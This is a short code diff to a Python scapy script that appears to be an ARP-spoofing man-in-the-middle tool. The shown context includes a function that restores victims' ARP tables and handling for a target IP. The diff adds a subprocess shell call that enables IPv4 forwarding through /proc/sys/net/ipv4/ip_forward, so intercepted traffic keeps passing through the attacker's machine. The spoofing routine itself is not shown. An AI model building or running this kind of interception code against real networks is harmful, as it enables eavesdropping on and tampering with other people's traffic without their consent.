@@ -3,6 +3,7 @@
 import argparse
 import scapy.all as scapy
 import time
+import subprocess
 
 
 # Function to get IP addresses of the host and gateway to target
@@ -45,6 +46,9 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
+
+# Enable port-forwarding
+subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
 
 options = get_arguments()
 target_ip = options.target
